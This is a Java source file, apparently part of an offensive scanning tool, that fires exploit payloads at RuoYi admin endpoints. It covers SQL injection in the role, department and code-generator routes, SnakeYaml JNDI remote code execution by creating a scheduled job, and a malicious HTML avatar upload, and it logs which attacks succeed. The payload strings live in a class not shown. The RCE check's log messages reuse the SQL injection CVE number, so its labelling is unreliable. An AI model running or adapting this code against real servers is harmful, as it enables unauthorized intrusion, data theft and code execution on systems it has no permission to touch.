package com.liev.clouds.exp;

import com.liev.clouds.dao.HttpResponse;
import com.liev.clouds.payload.RuoYiPayload;
import com.liev.clouds.utils.HttpUtils;
import com.liev.clouds.webcontroller.framework.RuoYiController;

import java.util.Map;

/**
 * @author Revcloud
 * @since 2024/8/29 9:59
 */
public class RuoYiExp {


    /**
     * 检测 CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入漏洞
     *
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void sql_system_all(String url, Map<String, String> headers, RuoYiController controller) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        String[] endpoints = {"/system/role/list", "/system/dept/edit"};
        String[] payloads = {RuoYiPayload.SQL_system_role_list, RuoYiPayload.SQL_system_dept_edit};

        boolean vulnerabilityExists = false;

        for (int i = 0; i < endpoints.length; i++) {
            try {
                String targetUrl = url + endpoints[i];
                HttpResponse response = HttpUtils.sendPost(targetUrl, payloads[i], headers);
                String responseBody = response.getResponseBody();

                if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                    controller.log.appendText("[+++]CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入漏洞存在！【√】\n");
                    controller.responseBody.appendText(responseBody);
                    vulnerabilityExists = true;
                    break;
                }
            } catch (Exception e) {
                System.err.println("Error during HTTP request: " + e.getMessage());
            }
        }

        if (!vulnerabilityExists) {
            controller.log.appendText("[---]CVE-2023-49371 RuoYi 小于 4.6.2 SQL注入漏洞不存在！\n");
        }
    }


    /**
     * CVE-2022-48114 RuoYi 小于 4.7.5 SQL注入
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void sql_tool_gen_createTable(String url, Map<String, String> headers, RuoYiController controller){
        boolean is = false;

        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/tool/gen/creatTable";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.SQL_tool_gen_createTable, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("java.sql.SQLException")) {
                controller.log.appendText("[+++]CVE-2022-48114 RuoYi 小于 4.7.5 SQL注入漏洞存在！【√】\n");
                controller.responseBody.appendText(responseBody);
                // TODO 其它判断
                is = true;
            }else {
                controller.log.appendText("[---]CVE-2022-48114 RuoYi 小于 4.7.5 SQL注入漏洞不存在！\n");
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    /**
     * 定时任务RCE SnakeYaml调用jndi注入
     * @param url 基础 URL
     * @param headers 请求头
     * @param controller 控制器
     */
    public static void rce_Jndi_snakeyaml(String url, Map<String, String> headers, RuoYiController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/monitor/job/add";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.RCE_snakeyaml, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("操作成功")) {
                controller.log.appendText("[+++]CVE-2022-48114 RuoYi 等于 4.7.2 定时任务RCE漏洞存在！【√】\n");
                controller.responseBody.appendText(responseBody);
                // TODO 其它判断
            }else {
                controller.log.appendText("[---]CVE-2022-48114 RuoYi 等于 4.7.2 定时任务RCE漏洞不存在！\n");
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

    /**
     * RuoYi 小于 4.7.3 文件上传解析HTML
     * @param url
     * @param headers
     * @param controller
     */
    public static void upload_Html_rce(String url, Map<String, String> headers, RuoYiController controller){
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try{
            String urlTrue = url + "/system/user/profile/updateAvatar";
            HttpResponse response = HttpUtils.sendPost(urlTrue, RuoYiPayload.UPLOAD_system_user_profile_updateAvatar, headers);
            String responseBody = response.getResponseBody();
            if (response.getResponseCode() == 200 && responseBody.contains("操作成功")){
                controller.log.appendText("[+++]CVE-2022-32065 RuoYi 小于 4.7.3 文件上传解析HTML漏洞存在！【√】 \n");
                controller.responseBody.appendText(responseBody);
            }else {
                controller.log.appendText("[---]CVE-2022-32065 RuoYi 小于 4.7.3 文件上传解析HTML漏洞不存在！ \n");
            }
        }catch (Exception e){
            System.err.println("Error during HTTP request: " + e.getMessage());
        }
    }

}
